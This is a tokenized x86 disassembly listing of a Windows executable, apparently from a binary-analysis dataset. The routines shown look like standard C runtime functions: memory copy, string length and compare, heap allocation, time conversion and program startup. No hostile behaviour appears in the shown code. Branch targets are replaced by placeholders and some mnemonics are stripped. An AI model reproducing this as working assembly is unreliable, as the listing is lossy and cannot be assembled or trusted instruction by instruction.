mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_42e069
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_42a431
mov [ esi ] eax
add esi 0x4
push esi
call sub_42a431
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_428996
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_428996
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_42a431
pop ecx
mov [ rw-data ] eax
sub_4247e5
mov edi edi
push esi
push 0x4
push 0x20
call sub_42894a
mov esi eax
push esi
call sub_42a431
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_424816
push 0xc
push r--data
call sub_42b398
call sub_42af99
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_42472b
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42484c
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
sub_424869
push 0xc
push r--data
call sub_42b398
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_42b3dd
retn
cmp [ rw-data ] 0x3
jne r-xdata
push esi
push 0x4
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_42e2eb
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
call sub_425eb1
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_425e6f
mov [ esi ] eax
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4248bf
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push esi
push eax
call sub_42e31b
pop ecx
pop ecx
push [ ebp + 0x8 ]
jmp r-xdata
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
sub_424930
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_4249a0
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
sub ecx 0x1
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
add esi 0x1
mov [ edi ] al
add edi 0x1
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
sub ebx 0x1
jne r-xdata
sub ebx 0x1
jne r-xdata
xor eax eax
mov [ edi ] al
add edi 0x1
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
sub ecx 0x1
jne r-xdata
add edi 0x4
xor eax eax
sub ecx 0x1
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_424ac4
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42edaf
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_425eb1
test eax eax
je r-xdata
call sub_425eb1
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_424b04
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push edi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
lea edi [ ebx - 0x4 ]
test edi edi
jbe r-xdata
pop ebx
leave
retn
cmp [ ebp - 0x4 ] ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop edi
inc eax
inc ecx
inc [ ebp - 0x4 ]
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] edi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
sub_424bc4
push 0x14
push r--data
call sub_42b398
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42b3dd
retn 0x10
mov ecx [ ebp + 0x8 ]
sub ecx [ ebp + 0xc ]
mov [ ebp + 0x8 ] ecx
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_424c22
push 0xc
push r--data
call sub_42b398
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0xc ]
mov eax esi
imul eax [ ebp + 0x10 ]
add [ ebp + 0x8 ] eax
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_424c6d
call sub_42b3dd
retn 0x10
sub [ ebp + 0x8 ] esi
mov ecx [ ebp + 0x8 ]
call [ ebp + 0x14 ]
jmp r-xdata
dec [ ebp + 0x10 ]
js r-xdata
sub_424c85
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x1
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_42d5e8
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_424cd6
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_424c85
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x1
pop ebp
retn
sub_424d04
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x2
lea eax [ ebp - 0x10 ]
push eax
push 0x2
push [ ebp + 0x8 ]
call sub_42d5e8
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_424d55
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_424d04
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x2
pop ebp
retn
sub_424d83
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_423619
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x4
push [ ebp + 0x8 ]
call sub_42d5e8
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_424dd4
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_424d83
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
pop ebp
retn
sub_424e02
mov edi edi
push ebp
mov ebp esp
sub esp 0x48
push ebx
xor ebx ebx
push edi
mov edi eax
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ebx
cmp edi ebx
jne r-xdata
mov eax [ edi + 0x14 ]
cdq
mov ecx eax
mov eax edx
mov [ ebp - 0x14 ] ecx
add ecx 0xffffffbb
mov [ ebp - 0x10 ] eax
adc eax 0xffffffff
push esi
cmp eax ebx
ja r-xdata
call sub_425eb1
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_423d36
add esp 0x14
or edx 0xffffffff
mov eax edx
jmp r-xdata
call sub_425eb1
or edx 0xffffffff
mov [ eax ] 0x16
mov eax edx
jb r-xdata
pop edi
pop ebx
leave
retn
mov eax [ edi + 0x10 ]
cmp eax ebx
jl r-xdata
cmp ecx 0x408
ja r-xdata
cdq
push 0xc
pop ecx
idiv ecx
mov ecx edx
cdq
add [ ebp - 0x14 ] eax
mov [ edi + 0x10 ] ecx
adc [ ebp - 0x10 ] edx
cmp ecx ebx
jge r-xdata
cmp eax 0xb
jle r-xdata
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add ecx 0xffffffbb
adc eax 0xffffffff
cmp eax ebx
ja r-xdata
add ecx 0xc
add [ ebp - 0x14 ] 0xffffffff
mov [ edi + 0x10 ] ecx
adc [ ebp - 0x10 ] 0xffffffff
mov esi [ edi + 0x10 ]
mov eax [ esi * 4 + rw-data ]
push ebx
push 0x4
push [ ebp - 0x10 ]
cdq
push [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
call sub_42fdb0
or eax edx
mov ebx 0x190
jne r-xdata
jb r-xdata
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x10 ]
push 0x0
add eax 0x76c
push ebx
adc ecx 0x0
push ecx
push eax
call sub_42fdb0
or eax edx
jne r-xdata
push 0x0
push 0x64
push [ ebp - 0x10 ]
push [ ebp - 0x14 ]
call sub_42fdb0
or eax edx
jne r-xdata
cmp ecx 0x408
ja r-xdata
mov esi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x10 ]
push 0x0
pop ecx
sub esi 0x1
sbb eax ecx
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
push ecx
add eax 0x12b
push ebx
adc edx ecx
push edx
push eax
mov [ ebp - 0x24 ] esi
call sub_42fd00
mov ebx eax
mov eax edx
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
cdq
push 0x0
push 0x64
push [ ebp - 0x20 ]
add ebx eax
mov eax [ ebp - 0xc ]
adc eax edx
push esi
mov [ ebp - 0xc ] eax
call sub_42fd00
push 0x0
push 0x4
push [ ebp - 0x20 ]
sub ebx eax
mov eax [ ebp - 0xc ]
sbb eax edx
push esi
mov [ ebp - 0xc ] eax
call sub_42fd00
push 0x0
push 0x16d
push [ ebp - 0x10 ]
add ebx eax
mov eax [ ebp - 0xc ]
push [ ebp - 0x14 ]
adc eax edx
mov [ ebp - 0xc ] eax
call sub_428c70
add ebx eax
mov eax [ ebp - 0xc ]
adc eax edx
add ebx [ ebp - 0x1c ]
push 0x0
adc eax [ ebp - 0x18 ]
pop esi
push esi
sub ebx 0x63df
push 0x18
sbb eax esi
push eax
push ebx
call sub_428c70
mov ecx eax
mov eax [ edi + 0x8 ]
mov ebx edx
cdq
push esi
add eax ecx
push 0x3c
adc edx ebx
push edx
push eax
call sub_428c70
mov ecx eax
mov eax [ edi + 0x4 ]
mov ebx edx
cdq
add eax ecx
adc edx ebx
push esi
push 0x3c
push edx
push eax
call sub_428c70
mov ecx eax
mov eax [ edi ]
mov ebx edx
cdq
add eax ecx
adc edx ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
cmp [ ebp + 0x8 ] esi
je r-xdata
cmp esi 0x1
jle r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call sub_42ef62
call sub_42fc68
lea eax [ ebp - 0x8 ]
push eax
call sub_42f496
pop ecx
test eax eax
je r-xdata
add [ ebp - 0x1c ] 0x1
adc [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
push 0x9
pop ecx
lea esi [ ebp - 0x48 ]
[ edi ] [ esi ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
call sub_42f4cf
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
pop esi
mov eax [ ebp - 0x4 ]
cdq
add [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
adc [ ebp - 0x10 ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_42f1a5
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_423c0e
add esp 0x14
mov eax [ edi + 0x20 ]
cmp eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
cdq
add [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
adc [ ebp - 0x10 ] edx
lea eax [ ebp - 0x48 ]
push eax
call sub_42f1a5
jmp r-xdata
jge r-xdata
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x28 ] esi
jle r-xdata
sub_4250d0
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_425158 ]
jmp [ ecx * 4 + jump_table_4251d8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_425244 ]
pop esi
pop edi
pop ebp
jmp sub_42fee9
jmp [ ecx * 4 + jump_table_4253e0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_4252e4 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4253e0 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_425244 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4253e0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_425244 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_425244 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_425244 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4253e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4253e0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_4253e0 ]
sub_425435
push 0xc
push r--data
call sub_42b398
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_42b3dd
retn
push 0x4
call sub_42e2b8
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_42eaca
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42547b
sub_425484
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_42e041
pop ecx
call sub_425eb1
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_42c6ea
push 0x1e
call sub_42c53f
push 0xff
call sub_42af81
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_425435
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_425eb1
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_42e041
pop ecx
test eax eax
je r-xdata
call sub_425eb1
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_42554e
push 0x10
push r--data
call sub_42b398
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_425484
pop ecx
jmp r-xdata
cmp [ rw-data ] 0x3
jne r-xdata
push ebx
call sub_424869
pop ecx
jmp r-xdata
call sub_42b3dd
retn
cmp esi 0xffffffe0
jbe r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
test esi esi
jne r-xdata
push esi
call sub_42e041
pop ecx
call sub_425eb1
push 0x4
call sub_42e2b8
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_42e2eb
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
inc esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_425692
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_42e7e9
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_42e041
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_42eaca
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_425eb1
call sub_425eb1
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_42e041
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_425e6f
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_425eb1
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_425eb1
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_4285a0
push ebx
call sub_42e2eb
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_42e31b
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_425e6f
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_4285a0
push ebx
push [ ebp - 0x20 ]
call sub_42e31b
add esp 0x14
mov eax esi
sub_425792
push 0x14
push r--data
call sub_42b398
mov eax 0x5a4d
cmp [ __dos_header ] ax
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
call sub_42a8ec
test eax eax
jne r-xdata
push 0x1c
call sub_425769
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_430799
and [ ebp - 0x4 ] 0x0
call sub_430545
test eax eax
jge r-xdata
push 0x10
call sub_425769
cmp [ eax + r--data ] 0xe
jbe r-xdata
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_43040e
mov [ rw-data ] eax
call sub_430353
test eax eax
jge r-xdata
push 0x1b
call sub_42af2d
pop ecx
xor ecx ecx
cmp [ eax + __coff_header ] ecx
setne cl
mov [ ebp - 0x1c ] ecx
jmp r-xdata
call sub_4300db
test eax eax
jge r-xdata
push 0x8
call sub_42af2d
pop ecx
push 0x1
call sub_42e10c
pop ecx
test eax eax
jne r-xdata
push 0x1
call sub_42afec
pop ecx
test eax eax
je r-xdata
push 0x9
call sub_42af2d
pop ecx
mov eax [ rw-data ]
mov [ rw-data ] eax
push eax
push [ rw-data ]
push [ rw-data ]
call sub_4016b9
add esp 0xc
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
push eax
call sub_42af2d
pop ecx
call sub_42b1c9
jmp sub_4258d4
push eax
call sub_42b19d
sub_4258f0
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
add ecx 0x1
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea esp [ esp ]
lea esp [ esp ]
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
